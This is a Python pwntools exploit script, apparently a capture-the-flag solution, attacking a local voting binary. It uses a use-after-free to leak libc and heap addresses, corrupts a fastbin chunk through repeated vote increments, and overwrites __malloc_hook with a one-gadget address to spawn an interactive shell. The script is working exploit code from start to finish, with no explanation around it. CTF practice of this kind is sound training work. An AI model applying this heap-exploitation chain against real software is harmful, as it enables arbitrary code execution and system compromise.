from pwn import *
context(log_level='debug')
p=process('./vote',env={"LD_PRELOAD":"./libc-2.23.so"})
def attach(*addrs):
	script="c"
	for addr in addrs:
		script="b *0x%x\n"%addr+script
	gdb.attach(p,script)
def create(size,name):
	p.recvuntil('Action: ')
	p.sendline('0')
	p.recv()
	p.sendline(str(size))
	p.recv()
	p.sendline(name)
def show(index):
	p.recvuntil('Action: ')
	p.sendline('1')
	p.recv()
	p.sendline(str(index))
	p.recvuntil('name: ')
	name=p.recvline()
	p.recvuntil('count: ')
	count=int(p.recvline())
	p.recvuntil('time: ')
	time=int(p.recvline())
	print name,hex(count),hex(time)
	return name,count,time
def vote(index):
	p.recvuntil('Action: ')
	p.sendline('2')
	p.recv()
	p.sendline(str(index))
def cancel(index):
	p.recvuntil('Action: ')
	p.sendline('4')
	p.recv()
	p.sendline(str(index))
def main():
	# uaf
	create(0x100,'cpegg')
	create(0x100,'cpegg')
	create(0x100,'cpegg')
	cancel(2)
	cancel(0)
	
	(name,count,time)=show(0)
	libc_base=time-0x3c4b78
	heap_base=count&0xfffffffffffff000
	log.success('libc_base:%x heap_base:%x'%(libc_base,heap_base))

	malloc_hook=libc_base+0x3C4B10
	
	fake_chunk=p64(0)+p64(0x71)+p64(malloc_hook-0x23)
	create(0x50,fake_chunk)
	create(0x50,'44444')
	cancel(3)
	cancel(4)
	
	for i in range(0x20):
		vote(4)

	create(0x50,'55555')
	create(0x50,'66666')
	attach(0x400D8C)
	create(0x50,'a'*0x3+p64(libc_base+0xF0274))

	p.recvuntil('Action: ')
	p.sendline('0')
	p.recv()
	p.sendline(str(0x60))
	
	p.interactive()

if __name__=='__main__':
	main()